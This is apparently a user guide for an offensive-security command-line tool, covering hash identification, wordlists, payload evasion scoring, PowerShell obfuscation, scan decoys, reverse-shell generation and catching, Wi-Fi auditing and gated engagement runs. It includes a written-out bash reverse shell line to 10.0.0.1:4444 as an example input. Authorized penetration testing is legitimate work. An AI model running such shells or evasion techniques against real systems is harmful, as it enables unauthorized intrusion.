# Command Guide

A friendly, copy-paste reference for **security-agent** — aimed at people who are
new to the tool. Every command is listed with a one-line description and an
example you can run as-is.

- The examples assume the binary is called `security-agent`. If you built it
  yourself, it lives at `./target/release/security-agent` — either copy it onto
  your `PATH` or replace `security-agent` with that path in the examples.
- Anything in `<angle brackets>` is a value **you** fill in. Anything in
  `[square brackets]` is optional.
- The same commands are available inside the interactive menu — run
  `security-agent --tui` if you'd rather point-and-pick than type flags.
- **On Android?** Install it in one guided step with `make android-install`
  (or `./scripts/android-install.sh`). See [Running on Android](OPERATING_GUIDE.md#7-running-on-android).

---

## The one rule to remember: offline by default 🔌

security-agent performs **no live network activity** unless you explicitly add
the `--allow-network` flag. Commands that *can* reach the network are marked
**🌐 NETWORK** below; without the flag they still run, but stay offline — they
simply skip the live-network actions (for example `--run-engagement` plans and
runs its offline stages, and `--run-external-tool` still runs local-only
tools). The one exception is `--listen`, whose only job is to open a socket, so
it refuses to start without the flag. Everything else reads only the files you
point it at and is safe to explore.

> Only use `--allow-network` against systems **you are authorized to test.**

---

## Quick start (first five minutes) 🚀

```sh
security-agent                       # health check (same as --offline-status)
security-agent --about               # what this build is, and its mission
security-agent --guide               # the full built-in guide
security-agent --list-tools          # which analysis tools are available here
security-agent --ask "who are you"   # ask in plain English
```

If any of those print output without an error, you're ready to go.

---

## 1. Getting started 🧭

| Command | What it does | Try it |
|---|---|---|
| `--offline-status` | Health check: tools, skills, coverage. Also the default with no args. | `security-agent --offline-status` |
| `--about` / `--version` | Shows identity, version, and roadmap (leads with the build stamp). | `security-agent --about` |
| `--build-info [--json]` | Prints build provenance: commit, build date, target, profile, compiler. `--json` for one machine-readable line. | `security-agent --build-info` |
| `--guide [section]` | The full plain-language guide; add a section name to focus. | `security-agent --guide reverse-shell` |
| `--tool-help <cmd>` | Focused help for a single command. | `security-agent --tool-help --gen-shell` |
| `--list-tools` | Lists cataloged tools and whether each is installed / built-in / missing. | `security-agent --list-tools` |
| `--list-skills` | Lists the step-by-step playbooks compiled into the binary. | `security-agent --list-skills` |
| `--show-skill <name>` | Prints one skill's full playbook. | `security-agent --show-skill nmap` |
| `--ask "<text>"` | Routes a plain-English request to the right read-only action. | `security-agent --ask "what tools do you have"` |
| `--tui` | Interactive terminal menu over every command. | `security-agent --tui` |

## 2. Credential & password helpers 🔑

| Command | What it does | Try it |
|---|---|---|
| `--hash-id <hash>` | Identifies a hash type and the right cracking mode. | `security-agent --hash-id 5d41402abc4b2a76b9719d911017c592` |
| `--password-strength <pw>` | Rates a password: entropy, crack time, weaknesses. | `security-agent --password-strength 'Tr0ub4dor&3'` |
| `--gen-wordlist <name> [company] [year] [words...]` | Builds a targeted password wordlist from facts you know. | `security-agent --gen-wordlist acme-corp Acme 2026 admin` |

## 3. Payloads & evasion (offense) 🧪

| Command | What it does | Try it |
|---|---|---|
| `--analyze-payload <payload>` | Scores a payload's entropy and detectability, with evasion tips. | `security-agent --analyze-payload 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'` |
| `--obfuscate-ps <command>` | Returns obfuscated PowerShell variants of a command. | `security-agent --obfuscate-ps 'Get-Process'` |
| `--gen-decoys <real-ip> [count]` | Generates decoy IPs to mask a scan's source. | `security-agent --gen-decoys 192.168.1.100 8` |

## 4. Reverse shells 🐚

The workflow: **generate** a payload → **listen** on your machine → run the
payload on the target → catch the shell. See the whole thing with
`security-agent --shell-guide`.

| Command | What it does | Try it |
|---|---|---|
| `--gen-shell <type> <lhost> <lport>` | Prints a ready-to-paste reverse/bind shell one-liner. `--list` shows all types. | `security-agent --gen-shell bash 10.0.0.5 4444` |
| `--listen <port> [max] [bind] [--log <file>]` 🌐 | Catches inbound shells; `--log` writes a session audit trail. | `security-agent --allow-network --listen 4444` |
| `--shell-guide` | The end-to-end reverse-shell tutorial. | `security-agent --shell-guide` |

## 5. Wireless auditing 📶

| Command | What it does | Try it |
|---|---|---|
| `--audit-wifi <essid> <protocol> <encryption>` | Rates a Wi-Fi network and lists weaknesses. | `security-agent --audit-wifi MyNet wpa2 aes` |
| `--wps-pin <pin>` | Checks a WPS PIN for default/vulnerable status. | `security-agent --wps-pin 12345670` |
| `--analyze-handshake <hex-frame...>` | Checks whether a captured WPA handshake is complete. | `security-agent --analyze-handshake 01030000abcd 02010000ef01` |

## 6. Host hardening review (defense) 🛡️

Point these at local system files to spot privilege-escalation risk.

| Command | What it does | Try it |
|---|---|---|
| `--analyze-passwd <path>` | Flags risky accounts in `/etc/passwd`. | `security-agent --analyze-passwd /etc/passwd` |
| `--analyze-sudoers <path>` | Flags dangerous sudo rules (NOPASSWD, writable paths). | `security-agent --analyze-sudoers /etc/sudoers` |
| `--analyze-keys <path>` | Flags SSH `authorized_keys` lateral-movement risk. | `security-agent --analyze-keys ~/.ssh/authorized_keys` |

## 7. Running analysis tools 🧰

| Command | What it does | Try it |
|---|---|---|
| `--run-tool <name> <file> [--output <file>]` | Runs a built-in **offline** analyzer on a local file (no network, no install needed). | `security-agent --run-tool wireshark capture.pcap` |
| `--run-external-tool [--allow-network] <name> <args...>` 🌐 | Runs a **real, installed** tool binary. Live tools need `--allow-network`. | `security-agent --run-external-tool semgrep --version` |

> `--run-tool` covers offline substitutes for ~80 cataloged tools plus the
> built-in forensic set (autopsy, volatility, wireshark/pcap, binwalk, foremost,
> bulk_extractor, hashdeep). See each tool's `.github/skills/<tool>/ARSENAL.md`.

## 8. Planning a full engagement 📋

These turn an authorized scope (a config file) into an auditable plan and run it.
Start from [`examples/engagement.example.conf`](examples/engagement.example.conf).

| Command | What it does | Try it |
|---|---|---|
| `--plan-scan <config> [--execute <args>]` 🌐 | Validates scope/approvals/time window and prints the scan plan (optionally executes). | `security-agent --plan-scan engagement.conf` |
| `--run-engagement <config> [flags] [-- <args>]` 🌐 | Runs the concurrent, staged engine (discovery → active → exploitation) with safety guards. | `security-agent --run-engagement engagement.conf` |

**Useful `--run-engagement` flags** (all optional, all safe defaults):

| Flag | Meaning |
|---|---|
| `--allow-network` | Opt in to live traffic (off by default — nothing hits the network without it). |
| `--allow-tool <name>` | Narrow the run to a subset of the engagement's approved tools (repeatable). |
| `--deny-tool <name>` | Block specific tools (repeatable). |
| `--max-concurrency <N>` | Max tools running at once (default 4). |
| `--per-tool-timeout <secs>` | Kill any tool that runs longer than this. |
| `--min-spawn-interval <secs>` | Rate-limit: minimum gap between tool launches. |
| `--secrets <file>` | Resolve `${secret:NAME}` refs and redact them from output. See [`examples/secrets.example.env`](examples/secrets.example.env). |
| `--events <file>` | Stream the run's lifecycle as JSON lines to a file. |
| `--findings-log <path>` / `--findings-db <path>` | Persist findings to a log / embedded store. |
| `--audit-log <path>` / `--audit-db <path>` | Write the run's **audit trail** (every tool completed/failed/refused, plus discovery/expansion/completion summaries) to a JSON Lines log / `.sadb` store. |
| `--report-out <path>` | Write the full **engagement deliverable** (run summary, discovery inventory, execution timeline, findings) to a file. |
| `--report-format markdown\|json` | Format for `--report-out` (default `markdown`). |
| `--control-file <path>` | Enable **real-time control**: steer the run live from another terminal (see below). |
| `--no-expand` | Disable result-driven expansion (run only the initially planned steps). |

The engine only ever runs tools the engagement approved (the **active-tool
gate**), and only reaches the target addresses your config declares.

**Result-driven expansion (on by default).** As discovery finds live services
and URLs, the engine automatically schedules the right authorized follow-up
tools — e.g. an open web service gets web scanners, an SMB share gets
enumeration — and runs them in a later round, repeating until nothing new is
found. Every added step still passes the active-tool gate and scope checks, so
expansion can never exceed the engagement's authorization. Use `--no-expand` to
turn it off. The run summary reports how many follow-up steps were added.

**Deliverable & audit trail.** Two outputs turn a run into a hand-off record.
`--report-out <file>` writes the full **engagement deliverable** — run summary,
discovery inventory (hosts/services/endpoints), the per-stage execution
timeline, and the findings rollup — in Markdown (default) or JSON
(`--report-format json`). `--audit-log <file>` (and/or `--audit-db <file>`)
writes an append-only **audit trail**: one record for every tool that
completed, failed, or was refused (with the reason), plus discovery,
expansion, and completion summaries — each keyed to the engagement id and
stamped with who authorized it. Read it back any time with `--view-audit` /
`--view-audit-db`.

### Steering a running engagement (real-time control) 🎛️

Start the run with a control file, then drive it from a second terminal:

```sh
# terminal 1 — start the engagement, watching a control file
security-agent --run-engagement engagement.conf --control-file run.ctl

# terminal 2 — steer it live
security-agent --engagement-control run.ctl pause      # hold: finish in-flight tools, launch no more
security-agent --engagement-control run.ctl resume     # carry on
security-agent --engagement-control run.ctl rate 5     # min 5s between tool launches
security-agent --engagement-control run.ctl rate off   # remove the rate limit
security-agent --engagement-control run.ctl cancel      # stop (in-flight tools finish, then it ends)
```

`cancel` is final. Pause/resume and rate changes take effect within a moment.
With `--events`, each action is recorded (`run_paused` / `run_resumed` /
`run_cancelled`).

## 9. Reports & findings 📄

| Command | What it does | Try it |
|---|---|---|
| `--report <findings-log> [--format sarif\|json\|markdown]` | Renders a deliverable report. | `security-agent --report findings.jsonl --format markdown` |
| `--record-findings <dest> <source>` | Merges one findings log into another (bookkeeping only). | `security-agent --record-findings all.jsonl new.jsonl` |
| `--schedule-retest <findings-log>` | Orders findings by risk for a verification pass. | `security-agent --schedule-retest findings.jsonl` |

## 10. Viewing stored history 🗃️

Read-only viewers for persisted audit / findings data (never plan or execute).

| Command | What it does | Try it |
|---|---|---|
| `--view-audit <log>` | Reads a JSON Lines audit log. | `security-agent --view-audit audit.jsonl` |
| `--view-audit-db <db>` | Reads an audit `.sadb` store. | `security-agent --view-audit-db audit.sadb` |
| `--view-findings-db <db>` | Reads a findings `.sadb` store. | `security-agent --view-findings-db findings.sadb` |
| `--view-calibration-db <db>` | Reads confidence-calibration records. | `security-agent --view-calibration-db calibration.sadb` |
| `--view-reasoning-log-db <db>` | Reads archived reasoning chains. | `security-agent --view-reasoning-log-db reasoning.sadb` |

## 11. Neural / language features 🧠

A tiny, fully-offline model — no cloud, no API keys.

| Command | What it does | Try it |
|---|---|---|
| `--llm-generate <words...>` | Continues a prompt with the built-in model. | `security-agent --llm-generate the attacker likely` |
| `--llm-perplexity <words...>` | Scores how "in-domain" text reads (higher = odder). | `security-agent --llm-perplexity buffer overflow in parser` |

---

## Where files go 📁

Commands write only where you tell them to. Relative paths land in your current
directory, so a first-time run stays self-contained:

```sh
cd ~/my-engagement
security-agent --run-engagement engagement.conf \
  --events run-events.jsonl \
  --findings-log findings.jsonl \
  --audit-log audit.jsonl \
  --report-out deliverable.md
security-agent --report findings.jsonl --format markdown > findings-report.md
```

The `--run-engagement --report-out` deliverable covers the *whole run*
(what ran, what was discovered, the findings); the standalone `--report`
command renders a findings-only report from any findings log.

## Getting unstuck 🆘

- `security-agent --guide` — the full reference, any time.
- `security-agent --tool-help <command>` — help for one command.
- `security-agent --tui` — do it all from an interactive menu.
- Every command prints a usage hint if you call it without required arguments.
